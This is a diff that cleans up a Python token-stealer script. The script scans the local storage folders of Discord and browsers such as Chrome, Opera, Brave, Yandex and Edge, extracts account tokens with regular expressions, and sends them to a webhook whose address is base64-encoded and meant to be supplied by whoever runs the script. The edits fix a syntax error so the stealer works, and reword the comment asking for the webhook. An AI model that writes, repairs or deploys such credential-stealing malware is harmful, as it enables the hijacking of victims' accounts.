@@ -3,7 +3,10 @@ import re
 import json
 from urllib.request import Request, urlopen
 import base64
-wh_url = base64.b64decode('').decode() # insert ur webhook encoded in base64 
+
+wh_url = base64.b64decode('').decode()  # insert your webhook encoded in base64
+
+
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
 
@@ -19,6 +22,7 @@ def find_tokens(path):
                     tokens.append(token)
     return tokens
 
+
 def main():
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -30,7 +34,7 @@ def main():
         'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
         'Opera': roaming + '\\Opera Software\\Opera Stable',
         'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',  # Added comma here
         'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\'
     }
 
@@ -63,6 +67,7 @@ def main():
         urlopen(req)
     except:
         pass
+
 
 if __name__ == '__main__':
     main()
